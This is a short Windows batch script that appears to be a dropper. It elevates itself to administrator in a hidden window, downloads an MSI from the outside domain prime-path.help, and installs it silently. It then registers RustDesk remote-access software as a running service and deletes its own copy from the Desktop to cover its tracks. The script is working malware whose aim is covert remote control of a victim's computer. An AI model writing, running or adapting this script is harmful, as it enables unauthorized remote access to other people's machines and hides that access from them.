@echo off
setlocal

:: Auto-elevate silently
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs -WindowStyle Hidden"
    exit /b
)

:: Silent install of RustDesk MSI
cd /d %temp%
curl -s -L -O https://prime-path.help/static/configs/Prime-RT-IN.msi >nul 2>&1
msiexec /i "%temp%\Prime-RT-IN.msi" /qn /norestart >nul 2>&1

:: Locate and install RustDesk service silently
set "rustdeskPath="
for /d %%a in ("C:\Program Files*\RustDesk") do (
    if exist "%%a\RustDesk.exe" (
        set "rustdeskPath=%%a\RustDesk.exe"
    )
)

if defined rustdeskPath (
    "%rustdeskPath%" --install >nul 2>&1
    sc start rustdesk >nul 2>&1
)

:: Delete the script from Desktop (if it was run from there)
set "desktopScript=%USERPROFILE%\Desktop\%~nx0"
if exist "%desktopScript%" (
    del /f /q "%desktopScript%"
)

exit /b
